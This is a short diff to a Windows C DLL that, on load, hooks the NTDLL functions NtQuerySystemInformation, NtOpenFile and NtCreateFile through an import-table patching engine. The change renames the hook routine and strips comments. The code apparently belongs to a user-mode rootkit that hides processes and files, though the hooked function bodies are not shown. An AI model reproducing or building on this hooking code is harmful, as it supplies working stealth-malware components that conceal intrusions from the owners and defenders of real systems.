@@ -108,8 +108,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
     return status;
 }
 
-//API Hook Engine
-void *hook_function(char *szDllName, char *szFunctionName, void *pNewFunction)
+void *Hook(char *szDllName, char *szFunctionName, void *pNewFunction)
 {
 #define MakePtr(cast, ptr, addValue)(cast)((DWORD)(ptr) + (DWORD)(addValue))
     DWORD dwOldProtect, dwOldProtect2;
@@ -146,15 +145,14 @@ void *hook_function(char *szDllName, char *szFunctionName, void *pNewFunction)
     return (NULL);
 }
 
-//DLL EntryPoint
 bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
 {
     switch (dwReason)
     {
     case DLL_PROCESS_ATTACH:
-        hook_function("NTDLL.DLL", "NtQuerySystemInformation", HookedNtQuerySystemInformation);
-        hook_function("NTDLL.DLL", "NtOpenFile", NewNtOpenFile);
-        hook_function("NTDLL.DLL", "NtCreateFile", NewNtCreateFile);
+        Hook("NTDLL.DLL", "NtQuerySystemInformation", HookedNtQuerySystemInformation);
+        Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile);
+        Hook("NTDLL.DLL", "NtCreateFile", NewNtCreateFile);
         return TRUE;
     }
     return TRUE;
